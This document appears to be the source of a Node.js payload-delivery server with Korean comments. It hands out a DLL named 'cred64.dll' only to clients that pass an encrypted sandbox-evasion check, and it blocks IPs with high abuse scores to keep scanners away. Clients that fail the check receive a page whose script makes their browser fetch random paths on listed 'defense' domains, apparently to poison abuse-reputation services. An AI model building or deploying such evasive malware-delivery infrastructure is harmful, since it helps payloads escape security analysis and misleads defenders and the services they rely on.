const express = require("express");
const bodyParser = require("body-parser");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const { checkIPAbuseScore } = require('./getAbuseScore');
const app = express();

// 모든 출처 허용
app.use(cors({
        origin: "*", // 모든 출처 허용
    }));
app.use(bodyParser.json());

// 파일 경로 설정
const payloadFilePath = path.join(__dirname, "payload.txt");
const defenseDomainFilePath = path.join(__dirname, "defenseDomain.txt");

// 랜덤 도메인 가져오기 함수
function getRandomDomain() {
  const lines = fs.readFileSync(defenseDomainFilePath, "utf-8").split("\n").filter(Boolean);
  const randomIndex = Math.floor(Math.random() * lines.length);
  return lines[randomIndex];
}

// 랜덤 경로 가져오기 함수
function getRandomEndpoint() {
  const lines = fs.readFileSync(payloadFilePath, "utf-8").split("\n").filter(Boolean);
  const randomIndex = Math.floor(Math.random() * lines.length);
  return lines[randomIndex];
}

function getAbuseIPPoisoningPayload() {
    // 랜덤 도메인과 경로 가져오기
    const domain = getRandomDomain();
    const endpoint = getRandomEndpoint();
    console.log(`[DEBUG] Random domain selected: ${domain}`);
    console.log(`[DEBUG] Random endpoint selected: ${endpoint}`);

    // 브라우저에서 실행할 HTML 응답
    const htmlResponse = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Validation Failed</title>
        <script>
          (function() {
            console.log("Validation failed. Fetching random endpoint...");
            fetch("https://${domain}${endpoint}", {
              method: "GET",
              mode: "no-cors"
            })
            .then(() => console.log("Request to ${domain}${endpoint} sent successfully."))
            .catch(err => console.error("Error sending request to ${domain}${endpoint}:", err));
          })();
        </script>
      </head>
      <body>
        <h1>Validation Failed</h1>
        <p>Your request did not pass validation. Please contact support.</p>
      </body>
      </html>
    `;
    return htmlResponse;
}

// 차단된 IP 목록 파일
const blockedIPsFile = 'blocked_ips.json';

// 차단된 IP 목록 로드
let blockedIPs = [];
if (fs.existsSync(blockedIPsFile)) {
    blockedIPs = JSON.parse(fs.readFileSync(blockedIPsFile, 'utf-8'));
}

function blockIP(ip) {
    blockedIPs.push(ip);

    // 차단된 IP 저장
    fs.writeFileSync(blockedIPsFile, JSON.stringify(blockedIPs, null, 2));

    console.log(`Add ${ip} to ${blockedIPsFile}.`)
}

// IP 차단 미들웨어
app.use(async (req, res, next) => {
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // IPv6 로컬 주소 처리
    const ip = clientIP.replace('::ffff:', '');

    // 이미 차단된 IP인지 확인
    if (blockedIPs.includes(ip)) {
        console.log(`Blocked request from IP: ${ip}`);
        return res.status(403).send('Access denied: Your IP is blocked.');
    }

    // Abuse Score가 높은 경우 차단
    const abuseScore = await checkIPAbuseScore(ip);
    if (abuseScore !== null && abuseScore > 10) {
        console.log(`Blocking IP ${ip} with abuse confidence score of ${abuseScore}%.`);
        blockIP(ip);
        return res.status(403).send('Access denied: Your IP is blocked.');
    }

    next(); // 다음 미들웨어로 전달
});


// private.pem에서 개인 키 로드
const privateKeyPath = path.join(__dirname, "private.pem");
if (!fs.existsSync(privateKeyPath)) {
    console.error("[ERROR] private.pem 파일을 찾을 수 없습니다.");
    process.exit(1);
}
const PRIVATE_KEY = fs.readFileSync(privateKeyPath, "utf8");

// AES 복호화 함수
function aesDecrypt(encryptedData, aesKey, iv) {
    console.log("[DEBUG] AES 복호화 시작",aesKey,iv);
    const decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(aesKey, "base64"), Buffer.from(iv, "base64"));
    let decrypted = decipher.update(Buffer.from(encryptedData, "base64"));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    console.log("[DEBUG] AES 복호화 완료");
    return JSON.parse(decrypted.toString());
}

// RSA 복호화 함수
function rsaDecryptAesKey(encryptedKey) {
    console.log("[DEBUG] RSA 복호화 시작");
    const buffer = Buffer.from(encryptedKey, "base64");
    const decryptedKeyBuffer = crypto.privateDecrypt(
        {
            key: PRIVATE_KEY,
            padding: crypto.constants.RSA_PKCS1_PADDING,
        },
        buffer
    );

    console.log("[DEBUG] decryptedKeyBuffer",decryptedKeyBuffer)

    // AES 키 복구: Node.js에서는 Buffer를 Uint8Array로 변환
    const aesKey = Uint8Array.from(decryptedKeyBuffer.toString("utf8"), char => char.charCodeAt(0)) // new Uint8Array(decryptedKeyBuffer);

    console.log("[DEBUG] Successfully decrypted AES key",aesKey);
    return aesKey;
}

// 검증 함수
function validateResults(results, totalDomains) {
    console.log("[DEBUG] 결과 검증 시작");
    const hasAllDomains = results.length === totalDomains;

    let validTimeouts = true;
    let failedFetchTimesValid = true;
    let success = false;
    let notAllSuccess = false;

    for (const result of results) {
        const { error, elapsedTime } = result;
        console.log("errors : ",error, elapsedTime)
        if (error === "Timeout" && parseFloat(elapsedTime) < 3000) validTimeouts = false;
	if ((error === "Failed to fetch" || error == null) && parseFloat(elapsedTime) >= 3000) failedFetchTimesValid = false;
        if (error === null) { success = true;}
        else { notAllSuccess = true;}
    }

    console.log("[DEBUG] 결과 검증 완료");
    return hasAllDomains && validTimeouts && failedFetchTimesValid && success && notAllSuccess;
}

// IV와 타임스탬프 저장
const ivStore = new Map();

// IV 요청 엔드포인트
app.get("/request-iv", (req, res) => {
    console.log("[DEBUG] /request-iv 요청 수신");
    const iv = crypto.randomBytes(16).toString("base64");
    const timestamp = Date.now();
    ivStore.set(iv, timestamp);
    setTimeout(() => ivStore.delete(iv), 7000); // 5초 후 IV 삭제
    console.log("[DEBUG] IV 생성 완료:", { iv, timestamp });
    res.json({ iv });
});

// 공개 키 제공 엔드포인트
app.get("/public-key", (req, res) => {
    console.log("[DEBUG] /public-key 요청 수신");
    const publicKeyPath = path.join(__dirname, "public.pem");
    if (!fs.existsSync(publicKeyPath)) {
        console.error("[ERROR] public.pem 파일을 찾을 수 없습니다.");
        return res.status(404).send("Public key not found");
    }
    const publicKey = fs.readFileSync(publicKeyPath, "utf8");
    res.setHeader("Content-Type", "text/plain");
    console.log("[DEBUG] 공개 키 제공 완료");
    res.send(publicKey);
});

// 도메인 목록 제공 엔드포인트
app.get("/domains", (req, res) => {
    console.log("[DEBUG] /domains 요청 수신");

    const domainFilePath = path.join(__dirname, "domains.txt");

    // 도메인 파일 읽기
    fs.readFile(domainFilePath, "utf8", (err, data) => {
        if (err) {
            console.error("[ERROR] 도메인 파일 읽기 실패:", err.message);
            return res.status(500).json({ success: false, message: "Failed to read domains file." });
        }

        // 파일 내용을 배열로 변환
        const domains = data.split("\n").map(line => line.trim()).filter(line => line);
        console.log("[DEBUG] 도메인 목록 로드 성공:", domains);

        res.json(domains);
    });
});
// 파일 다운로드 엔드로인트 - 탐지 가능
app.get("/download_notbypass", (req, res) => {
    console.log("[DEBUG] /download_notbypass 요청 수신");

    try {
        // 검증 성공 시 파일 제공
        const filePath = path.join(__dirname, "files", "cred64_notbypass.dll");
        if (!fs.existsSync(filePath)) {
            console.error("[ERROR] 파일 없음:", filePath);
            return res.status(404).send("File not found");
        }

        console.log("[DEBUG] 검증 성공. 파일 다운로드 준비 중...");
        res.download(filePath);
    } catch (error) {
        console.error("[ERROR] 다운로드 처리 중 오류:", error.message);
        res.status(500).send("Download failed");
    }
});

// 파일 다운로드 엔드포인트 - 네트워크 sandbox 탐지 우회
app.get("/download", (req, res) => {
    console.log("[DEBUG] /download 요청 수신");
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // IPv6 로컬 주소 처리
    const ip = clientIP.replace('::ffff:', '');

    try {
        const { payload } = req.query;

        if (!payload) {
            console.error("[ERROR] payload 누락");
            return res.status(400).send("Missing payload");
        }

        const { encryptedData, encryptedKey, iv } = JSON.parse(payload);

        if (!encryptedData || !encryptedKey || !iv) {
            console.error("[ERROR] 암호화 데이터 누락");
            return res.status(400).send("Invalid payload");
        }

        // IV 유효성 검사
        const ivTimestamp = ivStore.get(iv);
        if (!ivTimestamp || Date.now() - ivTimestamp > 5000) {
            console.error("[ERROR] IV가 유효하지 않거나 만료되었습니다.");
            return res.status(400).send("IV is invalid or expired.");
        }

        // AES 키 복호화
        const aesKey = rsaDecryptAesKey(encryptedKey);

        // AES로 데이터 복호화
        const decryptedData = aesDecrypt(encryptedData, aesKey, iv);
        console.log("[DEBUG] 복호화된 데이터:", decryptedData);

        // domains.txt 파일 읽기
        domainsFilePath = "./domains.txt"
        if (!fs.existsSync(domainsFilePath)) {
            console.error("[ERROR] domains.txt 파일 없음");
            return res.status(500).send("Domains file not found");
        }
        const domainList = fs
            .readFileSync(domainsFilePath, "utf8")
            .split("\n")
            .map(line => line.trim())
            .filter(line => line);
        const totalDomains = domainList.length;
        console.log("[DEBUG] domains.txt 로드 성공. 총 도메인 수:", totalDomains);

        // 검증 로직
        const isValid = validateResults(decryptedData, totalDomains);

        if (!isValid) {
            console.error("[ERROR] 검증 실패");
            blockIP(ip);
            //return res.status(400).send("Validation failed.");
            return res.status(400).send(getAbuseIPPoisoningPayload());
        }

        // 검증 성공 시 파일 제공
        const filePath = path.join(__dirname, "files", "cred64.dll");
        if (!fs.existsSync(filePath)) {
            console.error("[ERROR] 파일 없음:", filePath);
            return res.status(404).send("File not found");
        }

        console.log("[DEBUG] 검증 성공. 파일 다운로드 준비 중...");
        res.download(filePath);
    } catch (error) {
        console.error("[ERROR] 다운로드 처리 중 오류:", error.message);
        res.status(500).send("Download failed");
    }
});


// HTTPS 설정
const https = require("https");
const http = require("http");

const sslOptions = {
    key: fs.readFileSync(path.join(__dirname, "ssl", "server.key")),
    cert: fs.readFileSync(path.join(__dirname, "ssl", "server.cert")),
};

// HTTP -> HTTPS 리다이렉트
//app.use((req, res, next) => {
//    if (!req.secure) {
//        return res.redirect(`https://${req.headers.host}${req.url}`);
//    }
//    next();
//});

// 정적 파일 제공
app.use(express.static(path.join(__dirname, "public")));

const HTTP_PORT = 80;
const HTTPS_PORT = 443;

// HTTP 서버
http.createServer(app).listen(HTTP_PORT, () => {
    console.log(`[DEBUG] HTTP server running on port ${HTTP_PORT}`);
});

// HTTPS 서버
https.createServer(sslOptions, app).listen(HTTPS_PORT, () => {
    console.log(`[DEBUG] HTTPS server running on port ${HTTPS_PORT}`);
});
